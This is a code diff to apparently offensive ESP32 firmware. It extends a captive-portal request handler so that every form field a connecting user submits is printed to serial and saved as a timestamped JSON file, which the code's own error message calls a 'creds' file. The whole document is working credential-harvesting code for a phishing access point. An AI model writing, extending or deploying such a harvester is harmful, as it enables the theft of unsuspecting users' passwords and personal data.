@@ -16,21 +16,32 @@
  */
 
 #include <ESPAsyncWebServer.h>
-
+#include "ArduinoJson.h"
 #include "Arduino.h"
+#include "posixsd.hpp"
+#include "../../include/debug.h"
 
 int captured_requests = 0;
 
 void captive_portal_callback(AsyncWebServerRequest *request) {
+  JsonDocument doc;
   for (size_t i = 0; i < request->args(); i++) {
-#ifdef ARDUINO_NANO_ESP32
+#ifndef ESP32S3_DEVKITC_BOARD
     Serial.printf("%s: %s\n", request->argName(i), request->arg(i));
 #else
     Serial0.printf("%s: %s\n", request->argName(i), request->arg(i));
 #endif
-    request->send(200);
-    captured_requests++;
+    doc[request->argName(i)] = request->arg(i);
   }
+  File creds = open((String) "/captive_portal/" + millis() + ".json", "w");
+  if(!creds) {
+    LOG_ERROR("Can't save creds file\n");
+    request->send(500);
+  } else {
+    serializeJsonPretty(doc, creds);
+    request->send(200);
+  }
+  captured_requests++;
 }
 
 int get_captured_requests() { return captured_requests; }
